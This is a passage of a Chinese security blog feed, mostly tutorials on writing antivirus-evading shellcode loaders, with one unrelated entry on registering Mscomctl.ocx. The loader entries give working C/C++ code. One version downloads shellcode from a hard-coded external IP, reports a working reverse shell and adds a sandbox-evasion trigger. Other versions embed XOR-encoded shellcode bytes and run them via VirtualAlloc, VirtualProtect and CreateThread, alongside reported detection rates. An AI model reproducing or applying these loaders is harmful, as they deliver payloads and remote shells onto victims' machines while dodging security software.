class="comment">/* 继续获取其他的子字符串 */</span></span><br><span class="line"><span class="keyword">while</span> (token != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">buf[i] = <span class="built_in">char</span>(<span class="built_in">stoi</span>(token)); <span class="comment">//stoi函数将字符串转换整数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s  %d\n&quot;</span>, token,i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, <span class="built_in">stoi</span>(token)); </span><br><span class="line">token = <span class="built_in">strtok</span>(<span class="literal">NULL</span>, s);</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">load</span>(buf, <span class="number">2048</span>);  <span class="comment">//晕了，指针传参回主函数不会了，先在这加载了</span></span><br><span class="line"><span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span>* data;</span><br><span class="line">data = <span class="built_in">WinGet</span>(<span class="string">&quot;101.43.138.109&quot;</span>, <span class="number">2333</span>, <span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;返回的数据为: &quot;</span> &lt;&lt; data &lt;&lt; endl;</span><br><span class="line"><span class="type">char</span> *buf = <span class="built_in">StrToShellcode</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>远程加载shellcode成功。</p><p>用反弹shell进行实战测试。远程加载成功。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220325175114246.png" alt="image-20220325175114246"></p><p>加一个简单的触发条件，避免沙箱直接运行白给。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span>* data;</span><br><span class="line">data = <span class="built_in">WinGet</span>(<span class="string">&quot;101.43.138.109&quot;</span>, <span class="number">2333</span>, <span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;返回的数据为: &quot;</span> &lt;&lt; data &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; argc;</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">2</span>) &#123;  <span class="comment">//命令行参数大于两个时才加载</span></span><br><span class="line"><span class="type">char</span>* buf = <span class="built_in">StrToShellcode</span>(data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>免杀效果，360静动全过，defender全查杀。virustotal检测效果如下。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220325175441623.png" alt="image-20220325175441623"></p>]]></content>
      
      
      <categories>
          
          <category> 木马免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>解决Mscomctl.ocx缺失的问题</title>
      <link href="/FixMscomctl-ocxMissing.html"/>
      <url>/FixMscomctl-ocxMissing.html</url>
      
        <content type="html"><![CDATA[<p>换了一台新电脑，出厂就是win11系统。之前工作使用到一款叫做<code>截面特性.exe</code>软件，在win7上是正常使用的，到了新电脑上无法运行。我开始以为是windows10/11的兼容性问题。使用兼容模式运行无果。</p><blockquote><p>Component ‘Mscomctl.ocx’ or one of its dependencies not correctly registered: a file is missing or invalid.</p></blockquote><p>分析报错信息就是Mscomctl.ocx这个文件缺失，网上一搜这个是Windows公用的ActiveX插件控制模块。然而给出的下载连接都是xx软件园，xx下载站，这种系统文件实在是不敢贸然下载来路不明的版本。</p><p>在本机搜索该文件，发现C:\Program Files\Microsoft Office\root\vfs\System目录下有这个文件，遂复制过来按照教程注册安装。结果在最后一步又出现以下错误</p><blockquote><p>模块”Mscomctl.ocx”已加载，但对DllRegisterServer的调用失败，错误代码为0x80004005。</p></blockquote><p>网上一搜说是权限问题，管理员权限运行命令就好了。可我用<del>system权限（错误示范）</del>的shell运行命令还是不行。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220314213201215.png" alt="image-20220314213201215"></p><hr><p>经过不断踩坑，终于找到了这篇靠谱的文章<a href="https://thegeekpage.com/mscomctl-ocx/">https://thegeekpage.com/mscomctl-ocx/</a> 完美解决了问题。</p><p>为了方便大家，我把这篇文章用中文复述一下。</p><p>MSCOMCTL.OCX（一个 ActiveX 控件文件/32 位控件）是过时的 Visual Basic 6.0 的一部分，安装方法如下：</p><h4 id="第一步：正确下载MSCOMCTL-OCX文件"><a href="#第一步：正确下载MSCOMCTL-OCX文件" class="headerlink" title="第一步：正确下载MSCOMCTL.OCX文件"></a><strong>第一步：</strong>正确下载MSCOMCTL.OCX文件</h4><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=10019">从微软官网</a>，下载Microsoft Visual Basic 6.0 Common Controls。使用压缩工具单独解压MSCOMCTL.OCX文件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220314213643109.png" alt="image-20220314213643109"></p><p>鉴于本文读者可能非计算机专业人员，我已经把文件提取好了，点击<a href="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/temporary/mscomctl.ocx">此链接</a>直接下载。</p><h4 id="第2步：将下载的文件复制C盘中："><a href="#第2步：将下载的文件复制C盘中：" class="headerlink" title="第2步：将下载的文件复制C盘中："></a><strong>第2步：</strong>将下载的文件复制<strong>C盘中</strong>：</h4><p>案例 1 - 如果您的计算机是 64 位，请转到下面给出的位置并粘贴它。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64</span><br></pre></td></tr></table></figure><p>案例 2 – 如果您的计算机是 32 位的 转到下面的位置并粘贴它。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32</span><br></pre></td></tr></table></figure><p>如果您不知道计算机的型号，就在两个文件加都复制一份。</p><h4 id="第3步：注册并安装"><a href="#第3步：注册并安装" class="headerlink" title="第3步：注册并安装"></a>第3步：注册并安装</h4><p>右键桌面左下角开始按钮，选择Windows终端(管理员)，或者在windows任务栏中的搜索框中输入cmd，右键选择以<strong>管理员身份运行</strong>。</p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220314214259455.png" alt="image-20220314214259455" style="zoom:50%;" /><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220314214424379.png" alt="image-20220314214424379" style="zoom:50%;" /><p>在打开的窗口中输入 regsvr32 mscomctl.ocx，大功告成。</p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220314220336198.png" alt="image-20220314220336198" style="zoom:50%;" /><p>软件可以正常使用了。</p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220314220406765.png" alt="image-20220314220406765" style="zoom:50%;" /><hr><p>希望可以帮助到您。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从0开始写ShellCode加载器0x1-Windows内存操作api</title>
      <link href="/BypassAVLearning.html"/>
      <url>/BypassAVLearning.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是从0开始写ShellCode加载器的第1篇文章，文章列表，样本demo已上传到<a href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p></blockquote><h2 id="Windows内存操作"><a href="#Windows内存操作" class="headerlink" title="Windows内存操作"></a>Windows内存操作</h2><p>Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p><p>申请方式：</p><ul><li>HeapAlloc</li><li>malloc</li><li>VirtualAlloc</li><li>new</li><li>LocalAlloc</li></ul><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x88\xa\xa\xa\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a\x81\x58\x6\x81\x58\x1e\x81\x78\x22\x5\xbd\x40\x2c\x3b\xf5\xa6\x36\x6b\x76\x8\x26\x2a\xcb\xc5\x7\xb\xcd\xe8\xf8\x58\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\xb\xdb\x5b\x81\x53\x2a\xb\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81\xb\xdc\x3b\xf5\xa6\xcb\xc5\x7\xb\xcd\x32\xea\x7f\xfc\x9\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\xb\xd9\x6c\x81\x6\x41\x81\x52\x16\xb\xd9\x81\xe\x81\xb\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1\x87\x57\x60\xb\x87\x8f\xb8\xa\xa\xa\x5a\x62\x3b\x81\x65\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf\x36\xc\x76\x0\x8a\xf1\xea\x7f\xf\xb1\x4d\x19\x78\x65\x60\xa\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\xa\xa&quot;</span>;</span><br><span class="line">    <span class="type">int</span> shellcodesize = <span class="built_in">sizeof</span>(buf);</span><br><span class="line">        <span class="comment">// 获取shellcode大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc函数，在调用进程的虚拟地址空间中保留、提交或更改页面区域的状态。</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">如果函数成功，则返回值是分配的页面区域的基地址。</span></span><br><span class="line"><span class="comment">如果函数失败，则返回值为NULL。要获取扩展的错误信息，请调用GetLastError。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">char</span>* shellcode = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">    <span class="comment">//CopyMemory将一块内存从一个位置复制到另一个位置。可能会造成缓冲区溢出</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">void CopyMemory(</span></span><br><span class="line"><span class="comment">  _In_       PVOID  指向复制块目标起始地址的指针,</span></span><br><span class="line"><span class="comment">  _In_ const VOID   指向要复制的内存块的起始地址的指针,</span></span><br><span class="line"><span class="comment">  _In_       SIZE_T 长度，</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"><span class="comment">//CreateThread函数，创建线程</span></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 若成功，接收新创建的线程的线程ID DWORD变量的地址。</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//通过调用 WaitForSingleObject 函数来监视事件状态,当事件设置为终止状态（WaitForSingleObject 返回 WAIT_OBJECT_0）时，每个线程都将自行终止执行。</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内存申请优化"><a href="#内存申请优化" class="headerlink" title="内存申请优化"></a>内存申请优化</h3><p>申请内存页时，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。这样也能规避掉一些特征查杀。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">//shellcode长度</span></span><br><span class="line">DWORD dwThreadId;<span class="comment">//线程Id</span></span><br><span class="line">HANDLE hThread;<span class="comment">//线程句柄</span></span><br><span class="line">DWORD dwOldProtect;<span class="comment">//内存页属性</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">shellcode_size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">&#123;</span><br><span class="line">buf[i] ^= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shellcode = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">shellcode_size,</span><br><span class="line">MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE  <span class="comment">//只申请可读可写</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size); <span class="comment">//将shellcode复制到可读可写的内存中</span></span><br><span class="line">    <span class="comment">//VirtualProtect 的 Win32 实现将更改对调用进程的虚拟地址空间中已提交页面区域的保护。</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    HRESULT VirtualProtect (</span></span><br><span class="line"><span class="comment">    [in]  void*   lpAddress,//一个指针，指向要更保护属性的虚拟内存的基址</span></span><br><span class="line"><span class="comment">    [in]  SIZE_T  dwSize,//要更改的内存页面区域的大小（以字节为单位）。</span></span><br><span class="line"><span class="comment">    [in]  DWORD   flNewProtect, //要应用的内存保护的类型。</span></span><br><span class="line"><span class="comment">    [out] DWORD*  pflOldProtect //一个指针，该指针指向前一个内存保护值。</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect); <span class="comment">//更改属性为可执行</span></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异或方式优化"><a href="#异或方式优化" class="headerlink" title="异或方式优化"></a>异或方式优化</h3><p>通常，我们使用循环去进行异或运算，会使用到异或运算符，这里是较为敏感的操作。InterlockedXorRelease函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;\x4d\x59\x3e\xb1\xb1\xb1\xd1\x80\x63\x38\x54\xd5\x3a\xe3\x81\x3a\xe3\xbd\x3a\xe3\xa5\x3a\xc3\x99\x80\x4e\xbe\x6\xfb\x97\x80\x71\x1d\x8d\xd0\xcd\xb3\x9d\x91\x70\x7e\xbc\xb0\x76\xf8\xc4\x5e\xe3\x3a\xe3\xa1\xe6\x95\xbe\x34\xc1\x4e\x4e\x4e\x58\x2a\x4e\x4e\x4e\xb0\x72\x98\x77\xc4\x70\x72\xa\x41\x4\x13\xe7\xdb\xb1\xe2\x4e\x64\xb1&quot;</span>;</span><br><span class="line">shellcode_size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">_InterlockedXor8(buf+i, <span class="number">177</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> shellcode_size = <span class="number">0</span>;</span><br><span class="line">DWORD dwThreadId; <span class="comment">//线程id</span></span><br><span class="line">HANDLE hThread;<span class="comment">//线程句柄</span></span><br><span class="line">DWORD dwOldProtect; <span class="comment">//内存页属性</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;\x66\x72\x18\x9a\x9a\x9a\xfa\x13\x7f\xab\x5a\xfe\x11\xca\xaa\x11\xc8\x96\x11\xc8\x8e\x11\xe8\xb2\x95\x2d\xd0\xbc\xab\x65\x36\xa6\xfb\xe6\x98\xb6\xba\x5b\x55\x97\x9b\x5d\x78\x68\xc8\xcd\x11\xc8\x8a\x11\xd0\xa6\x11\xd6\x8b\xe2\x79\xd2\x9b\x4b\xcb\x11\xc3\xba\x9b\x49\x11\xd3\x82\x79\xa0\xd3\x11\xae\x11\x9b\x4c\xab\x65\x36\x5b\x55\x97\x9b\x5d\xa2\x7a\xef\x6c\x99\xe7\x62\xa1\xe7\xbe\xef\x7e\xc2\x11\xc2\xbe\x9b\x49\xfc\x11\x96\xd1\x11\xc2\x86\x9b\x49\x11\x9e\x11\x9b\x4a\x13\xde\xbe\xbe\xc1\xc1\xfb\xc3\xc0\xcb\x65\x7a\xc5\xc5\xc0\x11\x88\x71\x17\xc7\xf0\x9b\x17\x1f\x28\x9a\x9a\x9a\xca\xf2\xab\x11\xf5\x1d\x65\x4f\x21\x6a\x2f\x38\xcc\xf2\x3c\xf\x27\x7\x65\x4f\xa6\x9c\xe6\x90\x1a\x61\x7a\xef\x9f\x21\xdd\x89\xe8\xf5\xf0\x9a\xc9\x65\x4f\xf9\xfb\xf6\xf9\xb4\xff\xe2\xff\x9a\x9a&quot;</span>;</span><br><span class="line">shellcode_size = <span class="built_in">sizeof</span>(buf);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">&#123;</span><br><span class="line">_InterlockedXor8(buf + i, <span class="number">7834</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>* shellcode = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//基址</span></span><br><span class="line">shellcode_size,  <span class="comment">//大小</span></span><br><span class="line">MEM_COMMIT, <span class="comment">//内存页状态</span></span><br><span class="line">PAGE_READWRITE <span class="comment">//可读可写可执行</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"><span class="built_in">VirtualProtect</span>(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比直接申请内存执行，免杀效果好了一些。但远不能让人满意，将shellcode置空，直接对加载器进行查杀，查杀率为23/67，C++申请内存执行的特征太明显。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220323194042597.png" alt="image-20220323194042597"></p>]]></content>
      
      
      <categories>
          
          <category> 木马免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>各语言ShellcodeLoader初探</title>
      <link href="/ShellcodeLoader.html"/>
      <url>/ShellcodeLoader.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是从0开始写ShellCode加载器的第0篇文章，文章列表，样本demo已上传到<a href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p></blockquote><h2 id="C-C-加载shellcode"><a href="#C-C-加载shellcode" class="headerlink" title="C/C++加载shellcode"></a>C/C++加载shellcode</h2><p>源码+shellcode直接编译：函数指针执行，汇编指令执行，申请动态内存</p><p>使用加载器加载shellcode</p><h3 id="函数指针执行"><a href="#函数指针执行" class="headerlink" title="函数指针执行"></a>函数指针执行</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="comment">//设置入口地址，不弹出黑窗口</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="申请动态内存加载"><a href="#申请动态内存加载" class="headerlink" title="申请动态内存加载"></a>申请动态内存加载</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">PVOID Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(buf),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//动态分配虚地址空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">//复制内存内容</span></span><br><span class="line"> 